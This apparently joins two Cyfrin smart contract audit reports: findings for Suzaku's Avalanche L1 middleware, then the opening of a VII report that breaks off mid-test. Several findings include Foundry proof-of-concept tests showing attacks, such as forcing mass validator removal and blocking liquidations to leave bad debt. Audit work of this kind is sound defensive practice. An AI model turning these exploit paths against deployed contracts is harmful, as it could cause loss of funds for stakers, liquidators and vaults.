### Insufficient update window validation can cause denial of service in `forceUpdateNodes`

**Description:** The `AvalancheL1Middleware` constructor fails to validate that the `UPDATE_WINDOW` parameter is less than the `EPOCH_DURATION`. This validation is critically important because the `onlyDuringFinalWindowOfEpoch` modifier, which is essential for stake management functionality, will permanently revert if `UPDATE_WINDOW` is greater than or equal to `EPOCH_DURATION`.

The `onlyDuringFinalWindowOfEpoch` modifier works by enforcing that a function can only be called during a specific time window at the end of an epoch:

```solidity
modifier onlyDuringFinalWindowOfEpoch() {
    uint48 currentEpoch = getCurrentEpoch();
    uint48 epochStartTs = getEpochStartTs(currentEpoch);
    uint48 timeNow = Time.timestamp();
    uint48 epochUpdatePeriod = epochStartTs + UPDATE_WINDOW;

    if (timeNow < epochUpdatePeriod || timeNow > epochStartTs + EPOCH_DURATION) { //@audit always reverts if UPDATE_WINDOW >= EPOCH_DURATION
        revert AvalancheL1Middleware__NotEpochUpdatePeriod(timeNow, epochUpdatePeriod);
    }
    _;
}
```

The modifier creates a valid execution window only when:

- `timeNow >= epochStartTs + UPDATE_WINDOW` (after the update window starts)
- `timeNow <= epochStartTs + EPOCH_DURATION` (before the epoch ends)

For this window to exist, `UPDATE_WINDOW` must be less than `EPOCH_DURATION`.

The constructor currently only validates that `slashingWindow` is not less than `epochDuration` but lacks a check for the `UPDATE_WINDOW`:

```solidity
constructor(
    AvalancheL1MiddlewareSettings memory settings,
    // other parameters...
) AssetClassRegistry(owner) {
    // other checks...

    if (settings.slashingWindow < settings.epochDuration) {
        revert AvalancheL1Middleware__SlashingWindowTooShort(settings.slashingWindow, settings.epochDuration);
    }

    // @audit No validation for UPDATE_WINDOW relation to EPOCH_DURATION

    // Initializations...
    EPOCH_DURATION = settings.epochDuration;
    UPDATE_WINDOW = settings.stakeUpdateWindow;
    // other initializations...
}
```

Since both `EPOCH_DURATION` and `UPDATE_WINDOW` are set as immutable variables, this issue cannot be corrected after deployment.

**Impact:** The `forceUpdateNodes()` function will be permanently unusable since it's protected by the `onlyDuringFinalWindowOfEpoch` modifier

**Recommended Mitigation:** Consider adding an explicit validation in the constructor to ensure that `UPDATE_WINDOW> 0 &&  UPDATE_WINDOW < EPOCH_DURATION`. Additionally, consider adding a comment clearly explaining the relationship between these time parameters to help prevent configuration errors:

```solidity
/**
 * @notice Required relationship between time parameters:
 * 0 < UPDATE_WINDOW < EPOCH_DURATION <= SLASHING_WINDOW
 */
```

**Suzaku:**
Fixed in commit [4f9d52a](https://github.com/suzaku-network/suzaku-core/pull/155/commits/4f9d52ac520312cfc0877a355f3d064229725fa2).

**Cyfrin:** Verified.


### Disabled operators can register new validator nodes

**Description:** The `AvalancheL1Middleware::addNode` function allows an operator to register a new node if msg.sender is included in the operators list. However, there is a potential issue with how the operator lifecycle is handled: before an operator is permanently removed via removeOperator, it must first be placed into a "disabled" state using disableOperator.

The problem arises because the addNode function does not check whether the operator is in a disabled stateit only checks for existence in the operators set. As a result, a disabled operator  can still call addNode, even though operationally they are expected to be inactive during this period.

**Impact:** A disabled operator can continue to register new validator nodes via addNode, despite being in a state that should preclude them from performing such actions.

**Recommended Mitigation:** Update the addNode function to also check whether the operator is enabled, not just registered:

```diff
(, uint48 disabledTime) = operators.getTimes(operator);
+if (!operators.contains(operator) || disabledTime > 0 ) {
-if (!operators.contains(operator)) {
    revert AvalancheL1Middleware__OperatorNotActive(operator);
}
```
**Suzaku:**
Fixed in commit [0e0d4ae](https://github.com/suzaku-network/suzaku-core/pull/155/commits/0e0d4aee6394b8acbda391e107db8fb9f49f7102).

**Cyfrin:** Verified.


### Hardcoded gas limit for hook in `onSlash` may cause reverts

**Description:** The `onSlash` function in the `BaseDelegator` contract conditionally invokes a hook via a low-level `call` if a hook address is set:

```solidity
assembly ("memory-safe") {
    pop(call(HOOK_GAS_LIMIT, hook_, 0, add(calldata_, 0x20), mload(calldata_), 0, 0))
}
```

This call uses a **hardcoded gas limit (`HOOK_GAS_LIMIT`)**, and the function enforces that at least `HOOK_RESERVE + HOOK_GAS_LIMIT * 64 / 63` gas is available before proceeding. If this requirement is not met, the function reverts with `BaseDelegator__InsufficientHookGas`.

This rigid gas enforcement introduces a fragility: if the hook's execution requires more gas than allocated by `HOOK_GAS_LIMIT`, the `call` may silently fail or the transaction may revert entirely.

**Impact:** Hooks that require more gas than the hardcoded limit will consistently fail, potentially breaking integrations.

As protocol complexity grows, hardcoded gas limits become brittle and may hinder composability or future extensions.

**Recommendation:**

Consider introducing a mechanism for the hook gas limit to be configured by the contract owner.

**Suzaku:**
Acknowledged.

**Cyfrin:** Acknowledged.


### `NodeId` truncation can potentially cause validator registration denial of service

**Description:** `AvalancheL1Middleware::addNode` function truncates 32-byte `nodeId` to 20-bytes when checking validator registration status. This truncation occurs when interacting with the `BalancerValidatorManager`.

```solidity
// AvalancheL1Middleware.sol
bytes32 valId = balancerValidatorManager.registeredValidators(
    abi.encodePacked(uint160(uint256(nodeId)))  // Truncates 32 bytes to 20 bytes
);
```

`uint160(uint256(nodeId))` discards the first 12 bytes of the `nodeId` before passing it to `BalancerValidatorManager::registeredValidators()`. However, the `ValidatorManager.registeredValidators()` function is designed to work with full bytes nodeId without any truncation.

**Impact:** Operators cannot register validators if another validator with a colliding truncated nodeId already exists

**Proof of Concept:** Run the following test in `AvalancheL1MiddlewareTest.t.sol`

```solidity
function test_NodeIdCollisionVulnerability() public {
    uint48 epoch = _calcAndWarpOneEpoch();

    // Create two different nodeIds that have the same first 20 bytes
    bytes32 nodeId1 = 0x0000000000000000000000001234567890abcdef1234567890abcdef12345678;
    bytes32 nodeId2 = 0xFFFFFFFFFFFFFFFFFFFFFFFF1234567890abcdef1234567890abcdef12345678;

    // share same first 20 bytes when truncated
    bytes memory truncated1 = abi.encodePacked(uint160(uint256(nodeId1)));
    bytes memory truncated2 = abi.encodePacked(uint160(uint256(nodeId2)));
    assertEq(keccak256(truncated1), keccak256(truncated2), "Truncated nodeIds should be identical");


    // Alice adds the first node
    vm.prank(alice);
    middleware.addNode(
                nodeId1,
                hex"ABABABAB", // dummy BLS
                uint64(block.timestamp + 2 days),
                PChainOwner({threshold: 1, addresses: new address[](1)}),
                PChainOwner({threshold: 1, addresses: new address[](1)}),
                100_000_000_001_000
            );

    // Verify first node was registered
    bytes32 validationId1 = mockValidatorManager.registeredValidators(truncated1);
    assertNotEq(validationId1, bytes32(0), "First node should be registered");

    // Alice tries to add the second node with different nodeId but same truncated bytes
    // This should fail due to collision
    vm.prank(alice);
    vm.expectRevert();
    middleware.addNode(
                nodeId2,
                hex"ABABABAB", // dummy BLS
                uint64(block.timestamp + 2 days),
                PChainOwner({threshold: 1, addresses: new address[](1)}),
                PChainOwner({threshold: 1, addresses: new address[](1)}),
                100_000_000_001_000
            );
}

```

**Recommended Mitigation:** Consider removing the forced truncation to 20 bytes


**Suzaku:**
Acknowledged.

**Cyfrin:** Acknowledged.


### Unbounded weight scale factor causes precision loss in stake conversion, potentially leading to loss of operator funds

**Description:** The `AvalancheL1Middleware` uses a `WEIGHT_SCALE_FACTOR` to convert between 256-bit stake amounts and 64-bit validator weights for the P-Chain. However, there are no bounds on this scale factor, and an inappropriately high value can cause precision loss.

The conversion process works as follows:

`stakeToWeight(): weight = stakeAmount / scaleFactor`
`weightToStake(): recoveredStake = weight * scaleFactor`

When `WEIGHT_SCALE_FACTOR` is too high relative to stake amounts, the division in `stakeToWeight()` truncates to zero, making the stake effectively unusable.


**Impact:** Weight recorded for validator can be 0 due to precision loss.

**Recommended Mitigation:** Consider implementing reasonable maximum bounds in the constructor.

**Suzaku:**
Fixed in commit [b38dfed](https://github.com/suzaku-network/suzaku-core/pull/155/commits/b38dfed1d21a628582b11d217f5112290b973034).

**Cyfrin:** Verified.


### `remainingBalanceOwner` should be set by the protocol owner

**Description:** The `remainingBalanceOwner` parameter, passed during the invocation of the `addNode` function, is intended to represent the P-Chain owner address that will receive any leftover `$AVAX` from a validator's balance when the validator is removed from the validator set. Currently, this value is provided by the operator invoking `addNode`.

However, from a protocol security and correctness perspective, the assignment of `remainingBalanceOwner` should not be left to the operator. Instead, this should be determined and configured by the protocol itself to prevent wrong party receiving leftover funds.

Example snippet from the function signature:

```solidity
function addNode(
        bytes32 nodeId,
        bytes calldata blsKey,
        uint64 registrationExpiry,
        PChainOwner calldata remainingBalanceOwner, // should be passed by the protocol
        PChainOwner calldata disableOwner,
        uint256 stakeAmount // optional
    ) external updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS) updateGlobalNodeStakeOncePerEpoch {
```

**Impact:** Misrouting of leftover \$AVAX funds upon validator removal, potentially enabling loss of funds for the stakers.

**Recommended Mitigation:** Modify the protocol to internally assign the `remainingBalanceOwner` during the `addNode` operation, removing this parameter from operator input.

```diff
function addNode(
        bytes32 nodeId,
        bytes calldata blsKey,
        uint64 registrationExpiry,
-        PChainOwner calldata remainingBalanceOwner,
        PChainOwner calldata disableOwner,
        uint256 stakeAmount // optional
    ) external updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS) updateGlobalNodeStakeOncePerEpoch {

}

```

**Suzaku:**
Acknowledged.

**Cyfrin:** Acknowledged.


### `forceUpdateNodes` potentially enables mass validator removal when new asset classes are added

**Description:** If `_requireMinSecondaryAssetClasses` is false, ie. the operator does not have minimum value of secondary asset, the validator is forcibly removed, regardless of whether the primary asset stake is above the minimum stake or not.

```solidity
function forceUpdateNodes(
    address operator,
    uint256 limitStake
) external updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS) onlyDuringFinalWindowOfEpoch updateGlobalNodeStakeOncePerEpoch {
    // ... validation and setup code ...

    // ... stake calculation logic ...

        uint256 newStake = previousStake - stakeToRemove;
        leftoverStake -= stakeToRemove;

        if (
            (newStake < assetClasses[PRIMARY_ASSET_CLASS].minValidatorStake)
            || !_requireMinSecondaryAssetClasses(0, operator)  // @audit || operator used here
        ) {
            newStake = 0;
            _initializeEndValidationAndFlag(operator, valID, nodeId);  // Node removed
        } else {
            _initializeValidatorStakeUpdate(operator, valID, newStake);
            emit NodeStakeUpdated(operator, nodeId, newStake, valID);
        }
    }
}
```

When a new secondary asset class is activated by owner via `activateSecondaryAssetClass()`, it is likely that existing operators initially have zero stake in that asset class, causing `_requireMinSecondaryAssetClasses` to return false.

Consider following scenario:

- Owner calls `activateSecondaryAssetClass(newAssetClassId)` without ensuring every operator meets the minimum stake requirement for new asset class
- Attacker calls `forceUpdateNodes(operator, 0)` for all operators during the immediate next update window
- Assuming a rebalancing scenario, all validator nodes for non-compliant operator get removed because `_requireMinSecondaryAssetClasses` returns false for the new asset class

**Impact:** Mass removal of validators for a given operator leads to unnecessary loss of rewards and an expensive process to re-register nodes.

**Proof of Concept:** Add to `AvalancheL!MiddlewareTest.t.sol`

```solidity

function test_massNodeRemovalAttack() public {
    // Alice already has substantial stake from setup: 200_000_000_002_000
    // Let's verify the initial state
    uint48 epoch = _calcAndWarpOneEpoch();

    uint256 aliceInitialStake = middleware.getOperatorStake(alice, epoch, assetClassId);
    console2.log("Alice's initial stake:", aliceInitialStake);
    assertGt(aliceInitialStake, 0, "Alice should have initial stake from setup");

    // Create 3 nodes with Alice's existing stake
    (bytes32[] memory nodeIds,,) = _createAndConfirmNodes(alice, 3, 0, true);
    epoch = _calcAndWarpOneEpoch();

    // Verify nodes are active
    assertEq(middleware.getOperatorNodesLength(alice), 3, "Should have 3 active nodes");
    uint256 usedStake = middleware.getOperatorUsedStakeCached(alice);
    console2.log("Used stake after creating nodes:", usedStake);


    // 1: Owner adds new secondary asset class
    ERC20Mock newAsset = new ERC20Mock();
    vm.startPrank(validatorManagerAddress);
    middleware.addAssetClass(5, 1000 ether, 10000 ether, address(newAsset));
    middleware.activateSecondaryAssetClass(5);
    vm.stopPrank();

    // 2: Reduce Alice's available stake to trigger rebalancing
    // Use the existing mintedShares from setup
    uint256 originalShares = mintedShares; // From setup
    uint256 reducedShares = originalShares / 3; // Drastically reduce

    _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, alice, reducedShares, delegator);
    epoch = _calcAndWarpOneEpoch();

    // Verify rebalancing condition: newStake < usedStake
    uint256 newStake = middleware.getOperatorStake(alice, epoch, assetClassId);
    uint256 currentUsedStake = middleware.getOperatorUsedStakeCached(alice);
    console2.log("New available stake:", newStake);
    console2.log("Current used stake:", currentUsedStake);
    assertTrue(newStake < currentUsedStake, "Should trigger rebalancing");

    // 3: Exploit during force update window
    _warpToLastHourOfCurrentEpoch();

    uint256 nodesBefore = middleware.getOperatorNodesLength(alice);

    // The vulnerability: OR logic causes removal even for nodes with adequate individual stake
    middleware.forceUpdateNodes(alice, 1); // using 1 wei as limit to trigger the issue

    epoch = _calcAndWarpOneEpoch();
    uint256 nodesAfter = middleware.getOperatorNodesLength(alice);

    console2.log("Nodes before attack:", nodesBefore);
    console2.log("Nodes after attack:", nodesAfter);

    // All nodes removed due to OR logic
    assertEq(nodesAfter, 0, "All nodes should be removed due to mass removal attack");
}

```

**Recommended Mitigation:** Consider adding a delay of atleast 1 epoch before minimum stake requirement is enforced on existing operators.

Since `forceUpdateNodes` is a public function that can trigger mass removal of validators, it would be dangerous to only rely on admin/owner to ensure every existing operator is compliant before adding a new secondary asset.

**Suzaku:**
Acknowledged.

**Cyfrin:** Acknowledged.


### Overpayment vulnerability in `registerL1`

**Description:** The `registerL1` function in the `L1Registry` contract does not handle excess Ether sent by users. If the `registerFee` is set to a nonzero value and a user sends more Ether than required, the contract keeps the entire amount instead of refunding the excess. If the `registerFee` is set to zero and a user sends Ether, that Ether becomes trapped in the contract with no way for the user to recover it, as there is no refund logic or withdrawal path for arbitrary senders.

**Impact:** Users can unintentionally lose funds by sending more Ether than required for registration. In the case where `registerFee` is zero, any Ether sent is permanently locked in the contract, as only the fee collector can withdraw accumulated fees, and only if they were tracked as unclaimed fees. This can lead to user frustration and loss of funds due to simple mistakes or misunderstandings about the required payment.

**Recommended Mitigation:** Implement logic in the `registerL1` function to refund any excess Ether sent above the required `registerFee`. For example, after transferring the required fee to the collector, track any remaining balance for the sender. Additionally, if `registerFee` is zero, revert the transaction if any Ether is sent, preventing accidental loss of funds.

**Suzaku:**
Fixed in commit [1c4cfe6](https://github.com/suzaku-network/suzaku-core/pull/155/commits/1c4cfe6a785287263b83f6c877678ba779abb3fb).

**Cyfrin:** Verified.

\clearpage
## Informational


### Wrong revert reason In `onSlash` functionality

**Description:** In the `onSlash` function of `VaultTokenized`, the following check is used to validate the `captureEpoch` parameter:
```solidity
if ((currentEpoch_ > 0 && captureEpoch < currentEpoch_ - 1) || captureEpoch > currentEpoch_) {
    revert Vault__InvalidCaptureEpoch();
}
```
If `currentEpoch_` is 0, the expression `captureEpoch < currentEpoch_ - 1` will underflow, since `currentEpoch_ - 1` becomes less than 0. This will cause the check to revert with a generic arithmetic error instead of the intended custom error.

**Impact:** If `currentEpoch_` is 0, calling `onSlash` will cause an underflow in the comparison, resulting in a revert with a generic arithmetic error rather than the intended `Vault__InvalidCaptureEpoch` error. This can make debugging more difficult and may lead to unexpected behavior for callers.

**Recommended Mitigation:** Update the condition to avoid underflow by checking:
```solidity
if ((currentEpoch_ > 0 && captureEpoch + 1 < currentEpoch_) || captureEpoch > currentEpoch_) {
    revert Vault__InvalidCaptureEpoch();
}
```
This ensures the check is safe for all values of `currentEpoch_` and always reverts with the correct custom error when the input is invalid.

**Suzaku:**
Fixed in commit [b654dfb](https://github.com/suzaku-network/suzaku-core/commit/b654dfbb31dd6e840f2f7dfcda0f55dda3ff37b2).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### Gas optimization for `getVaults` function

**Description:** The `MiddlewareVaultManager::getVaults` uses an inefficient pattern that iterates through the entire list of vaults twice. The first iteration counts the number of active vaults, while the second iteration builds the array of active vaults.

This implementation:

- Makes the same `vaults.atWithTimes(i)` calls twice
- Performs the same `_wasActiveAt()` calculation twice for each vault
- Results in unnecessary gas consumption, especially as the number of vaults grows

**Recommended Mitigation:** Consider refactoring the function to use a single-pass approach that eliminates the redundant iteration by caching the active vaults in the first loop.

```diff solidity
function getVaults(
    uint48 epoch
) external view returns (address[] memory) {
    uint256 vaultCount = vaults.length();
    uint48 epochStart = middleware.getEpochStartTs(epoch);

    // Early return for empty vaults
    if (vaultCount == 0) {
        return new address[](0);
    }

++    address[] memory tempVaults = new address[](vaultCount);
    uint256 activeCount = 0;

    // Single pass through the vaults
    for (uint256 i = 0; i < vaultCount; i++) {
        (address vault, uint48 enabledTime, uint48 disabledTime) = vaults.atWithTimes(i);
        if (_wasActiveAt(enabledTime, disabledTime, epochStart)) {
++          tempVaults[activeCount] = vault;
            activeCount++;
        }
    }

    // Create the final result array with correct size
    address[] memory activeVaults = new address[](activeCount);
-- uint256 activeIndex = 0;
-- for (uint256 i = 0; i < vaultCount; i++) {
--      (address vault, uint48 enabledTime, uint48 disabledTime) = vaults.atWithTimes(i);
--      if (_wasActiveAt(enabledTime, disabledTime, epochStart)) {
--          activeVaults[activeIndex] = vault;
--          activeIndex++;
--       }
--    }
++    for (uint256 i = 0; i < activeCount; i++) {
++       activeVaults[i] = tempVaults[i];
++    }

    return activeVaults;
}
```

**Suzaku:**
Fixed in commit [59a0109](https://github.com/suzaku-network/suzaku-core/commit/59a01095a1940aae4e75a87580695ca3e4d99712).

**Cyfrin:** Verified.


### Unnecessary `onlyRegisteredOperatorNode` on `completeStakeUpdate` function

**Description:** `completeStakeUpdate` is calling internal function `_completeStakeUpdate` which has the same modifier applied. Currently the modifier `onlyRegisteredOperatorNode` is checked twice.


**Recommended Mitigation:** Consider removing `onlyRegisteredOperatorNode` on `_completeStakeUpdate`

**Suzaku:**
Fixed in commit [f9946ef](https://github.com/suzaku-network/suzaku-core/commit/f9946ef8f6c7d7ab946e01d906f411352004ee41).

**Cyfrin:** Verified.


### Optimisation of elapsed epoch calculation

**Description:** In the `UptimeTracker::computeValidatorUptime` function, there is an opportunity to optimize how the number of elapsed epochs is calculated.

```solidity
Currently, the code redundantly retrieves both epoch indices and their corresponding start timestamps to compute the elapsed time between epochs:

uint48 lastUptimeEpoch = l1Middleware.getEpochAtTs(uint48(lastUptimeCheckpoint.timestamp));
uint256 lastUptimeEpochStart = l1Middleware.getEpochStartTs(lastUptimeEpoch);

uint48 currentEpoch = l1Middleware.getEpochAtTs(uint48(block.timestamp));
uint256 currentEpochStart = l1Middleware.getEpochStartTs(currentEpoch);

uint256 elapsedTime = currentEpochStart - lastUptimeEpochStart;
uint256 elapsedEpochs = elapsedTime / epochDuration;
```

However, since the epoch numbers themselves are already known (lastUptimeEpoch and currentEpoch), the number of full epochs that have elapsed can be directly calculated by subtracting the epoch indices, avoiding the unnecessary calls to getEpochStartTs.

**Recommended Mitigation:** Replace the timestamp-based epoch duration calculation with a simpler and more efficient version:

```diff
- uint256 elapsedTime = currentEpochStart - lastUptimeEpochStart;
- uint256 elapsedEpochs = elapsedTime / epochDuration;
+ uint256 elapsedEpochs = currentEpoch - lastUptimeEpoch;
```

This change reduces computational overhead and simplifies the logic while achieving the same result.

**Suzaku:**
Fixed in commit [f9946ef](https://github.com/suzaku-network/suzaku-core/commit/f9946ef8f6c7d7ab946e01d906f411352004ee41).

**Cyfrin:** Verified.


### Use unchecked block for increment operations in `distributeRewards`

**Description**

In `Rewards::distributeRewards`, an `unchecked` block can be used to optimize gas consumption for increment operations inside the loop.

```solidity
function distributeRewards(uint48 epoch, uint48 batchSize) external onlyRole(REWARDS_DISTRIBUTOR_ROLE) {
    DistributionBatch storage batch = distributionBatches[epoch];
    uint48 currentEpoch = l1Middleware.getCurrentEpoch();

    if (batch.isComplete) revert AlreadyCompleted(epoch);
    // Rewards can only be distributed after a 2-epoch delay
    if (epoch >= currentEpoch - 2) revert RewardsDistributionTooEarly(epoch, currentEpoch - 2);

    address[] memory operators = l1Middleware.getAllOperators();
    uint256 operatorCount = 0;

    for (uint256 i = batch.lastProcessedOperator; i < operators.length && operatorCount < batchSize; i++) {
        // Calculate operator's total share based on stake and uptime
        _calculateOperatorShare(epoch, operators[i]);

        // Calculate and store vault shares
        _calculateAndStoreVaultShares(epoch, operators[i]);

        batch.lastProcessedOperator = i + 1;
        operatorCount++;
    }

    if (batch.lastProcessedOperator >= operators.length) {
        batch.isComplete = true;
    }
}
```

**Recommended Mitigation**

Introduce an `unchecked` block for increment operations to optimize gas usage.

```diff
function distributeRewards(uint48 epoch, uint48 batchSize) external onlyRole(REWARDS_DISTRIBUTOR_ROLE) {
    DistributionBatch storage batch = distributionBatches[epoch];
    uint48 currentEpoch = l1Middleware.getCurrentEpoch();

    if (batch.isComplete) revert AlreadyCompleted(epoch);
    // Rewards can only be distributed after a 2-epoch delay
    if (epoch >= currentEpoch - 2) revert RewardsDistributionTooEarly(epoch, currentEpoch - 2);

    address[] memory operators = l1Middleware.getAllOperators();
    uint256 operatorCount = 0;

-   for (uint256 i = batch.lastProcessedOperator; i < operators.length && operatorCount < batchSize; i++) {
+   for (uint256 i = batch.lastProcessedOperator; i < operators.length && operatorCount < batchSize;) {
        // Calculate operator's total share based on stake and uptime
        _calculateOperatorShare(epoch, operators[i]);

        // Calculate and store vault shares
        _calculateAndStoreVaultShares(epoch, operators[i]);

+       unchecked {
            batch.lastProcessedOperator = i + 1;
            operatorCount++;
+          i++;
+       }
    }

    if (batch.lastProcessedOperator >= operators.length) {
        batch.isComplete = true;
    }
}
```

**Suzaku:**
Fixed in commit [2fb0daf](https://github.com/suzaku-network/suzaku-core/commit/2fb0dafd684eeaf11b177602c5047d1e6ce2d715).

**Cyfrin:** Verified.


### Optimize `_getStakerVaults` to Avoid Redundant External Calls to `activeBalanceOfAt`

**Description:** The `Rewards::_getStakerVaults` function performs two passes over the vault array to filter vaults with non-zero balances, which doubles the number of external calls to `IVaultTokenized.activeBalanceOfAt`.

```solidity
function _getStakerVaults(address staker, uint48 epoch) internal view returns (address[] memory) {
        address[] memory vaults = middlewareVaultManager.getVaults(epoch);
        uint48 epochStart = l1Middleware.getEpochStartTs(epoch);

        uint256 count = 0;

        // First pass: Count non-zero balance vaults
        for (uint256 i = 0; i < vaults.length; i++) {
            uint256 balance = IVaultTokenized(vaults[i]).activeBalanceOfAt(staker, epochStart, new bytes(0));
            if (balance > 0) {
                count++;
            }
        }

        // Create a new array with the exact number of valid vaults
        address[] memory validVaults = new address[](count);
        uint256 index = 0;

        // Second pass: Populate the new array
        for (uint256 i = 0; i < vaults.length; i++) {
            uint256 balance = IVaultTokenized(vaults[i]).activeBalanceOfAt(staker, epochStart, new bytes(0));
            if (balance > 0) {
                validVaults[index] = vaults[i];
                index++;
            }
        }

        return validVaults;
    }
```

**Recommended Mitigation:** Make the following change to the `_getStakerVaults`:

```diff
function _getStakerVaults(address staker, uint48 epoch) internal view returns (address[] memory) {
    address[] memory vaults = middlewareVaultManager.getVaults(epoch);
    uint48 epochStart = l1Middleware.getEpochStartTs(epoch);
+   address[] memory tempVaults = new address[](vaults.length); // Temporary oversized array
    uint256 count = 0;

-   // First pass: Count non-zero balance vaults
-   for (uint256 i = 0; i < vaults.length; i++) {
-       uint256 balance = IVaultTokenized(vaults[i]).activeBalanceOfAt(staker, epochStart, new bytes(0));
-       if (balance > 0) {
-           count++;
-       }
-   }
-
-   // Create a new array with the exact number of valid vaults
+   // Single pass: Collect valid vaults
+   for (uint256 i = 0; i < vaults.length;) {
+       if (IVaultTokenized(vaults[i]).activeBalanceOfAt(staker, epochStart, new bytes(0)) > 0) {
+           tempVaults[count] = vaults[i];
+           count++;
+       }
+       unchecked { i++; }
+   }
+
+   // Copy to correctly sized array
    address[] memory validVaults = new address[](count);
-   uint256 index = 0;
-
-   // Second pass: Populate the new array
-   for (uint256 i = 0; i < vaults.length; i++) {
-       uint256 balance = IVaultTokenized(vaults[i]).activeBalanceOfAt(staker, epochStart, new bytes(0));
-       if (balance > 0) {
-           validVaults[index] = vaults[i];
-           index++;
-       }
+   for (uint256 i = 0; i < count;) {
+       validVaults[i] = tempVaults[i];
+       unchecked { i++; }
    }

    return validVaults;
}
```

**Suzaku:**
Fixed in commit [2fb0daf](https://github.com/suzaku-network/suzaku-core/commit/2fb0dafd684eeaf11b177602c5047d1e6ce2d715).

**Cyfrin:** Verified.


### Redundant overflow checks in safe arithmetic operations

**Description:** `Solidity 0.8.25` includes built-in overflow checks for arithmetic operations, which add ~20-30 gas per operation. In `UptimeTracker::computeValidatorUptime`, operations like loop increments (i++) and additions (lastUptimeEpoch + i) are guaranteed not to overflow due to the use of uint48 and controlled inputs.

**Recommended Mitigation:** Use unchecked blocks for safe arithmetic operations:
```solidity

for (uint48 i = 0; i < elapsedEpochs;) {
    uint48 epoch;
    unchecked {
        epoch = lastUptimeEpoch + i;
        i++;
    }
    // ...
}
```

**Suzaku:**
Fixed in commit [2fb0daf](https://github.com/suzaku-network/suzaku-core/commit/2fb0dafd684eeaf11b177602c5047d1e6ce2d715).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2025-07-07-cyfrin-suzaku-core-v2.0.md ------


------ FILE START car/reports_md/2025-07-15-cyfrin-vii-v2.0.md ------

**Lead Auditors**

[Giovanni Di Siena](https://x.com/giovannidisiena)

[Stalin](https://x.com/0xstalin)

**Assisting Auditors**



---

# Findings
## Critical Risk


### Liquidations can be made to revert by an attacker through various means, causing losses to liquidators and bad debt to accrue in the vault

**Description:** Coordination between two malicious accounts combined with various other attack vectors fully documented in separate findings can be leveraged by an attacker to engineer scenarios in which liquidators are disincentivised or otherwise unable to unwind liquidatable positions due to an inability to recover the underlying collateral to which they are entitled.

To summarise the issues that make this attack possible:
* Fee theft causes partial unwraps to revert for positions that were already partially unwrapped. The expectation is that partial liquidation will execute and liquidator will perform a partial unwrap to recover the underlying collateral; however, this will not be possible if the wrapper contract holds insufficient balance to process the proportional transfer.
* Incorrect accounting causes transfer amounts to become inflated for positions that were previously partially unwrapped. This can cause liquidation to revert as the violator will have insufficient ERC-6909 to complete the transfer.
* Enabling collateral for which the sender has no ERC-6909 balance can be similarly utilized to block successful transfer of other collateral assets against which the violator has borrowed vault assets.

Consider the following scenario:
* Alice and Bob are controlled by the same malicious user.
* Alice owns a position represented by `tokenId1` and Bob owns a position represented by `tokenId2`.
* Both `tokenId1` and `tokenId2` positions accrue some fees.
* Alice transfers a small portion of `tokenId1` to Bob.
* Bob performs a small partial unwrap of `tokenId1`.
* Both `tokenId1` and `tokenId2` positions accrue some more fees.
* Alice borrows the max debt and shortly after the position becomes liquidatable.
* Bob front-runs partial liquidation of `tokenId1` with full unwrap of `tokenId2` through partial unwrap (fee theft exploit).
* Partial liquidation succeeds, transferring a portion of `tokenId1` to the liquidator.
* Liquidator attempts to partially unwrap `tokenId1` to retrieve the underlying principal collateral plus fees but it reverts.
* This either causes a loss to the liquidator if executed in separate transactions or prevents/disincentivizes partial liquidation if executed atomically.
* The position continues to become undercollateralized until it is fully liquidatable.
* The transfer during liquidation will revert due to the transfer inflation issue calculating a transfer amount larger than Alice's balance.
* Alice's position is undercollateralized and bad debt accrues in the vault.
* Note: without the transfer issue, Alice's entire `tokenId1` balance is transferred to the liquidator, but still it is not possible to recover the underlying collateral even with full unwrap as the liquidator does not own the entire ERC-6909 supply (Bob still holds a small portion).

As demonstrated below, this complex series of steps can successfully block liquidations. The violator can partially unwrap one position, and with another position can steal the remaining fees, leaving wrapper contract without sufficient currency balance for the remaining pending fees of the partially unwrapped position. When partial liquidation occurs, even if the liquidator is unwrapping a small portion of the full position, there are no fees on the balance which will cause the liquidation to revert. This setup can in fact be drastically reduced by simply enabling collateral for which the sender has no ERC-6909 balance, blocking successful transfer of other collateral assets backing the debt without relying on the fee theft.

**Impact:** An attacker can deliberately cause DoS that prevents their position from being liquidated with high likelihood. This has significant impact for the vault which will accrue bad debt.

**Proof of Concept:** Referencing the diff provided in a separate issue which defines `increasePosition()`, run the following tests with `forge test --mt test_blockLiquidationsPoC -vvv`:

* This first PoC uses the enabling of unowned collateral and transfer miscalculation:

```solidity
function test_blockLiquidationsPoC_enableCollateral() public {
    address attacker = makeAddr("attacker");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. borrower wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);

    // 2. attacker wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, attacker);

    // 3. attacker enables both tokenId1 and tokenId2 as collateral
    startHoax(attacker);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    // 4. attacker max borrows from vault
    evc.enableCollateral(attacker, address(wrapper));
    evc.enableController(attacker, address(eVault));
    eVault.borrow(type(uint256).max, attacker);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 5. simulate attacker becoming liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertTrue(maxRepay > 0);

    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));

    // @audit-issue => liquidator attempts to liquidate attacker
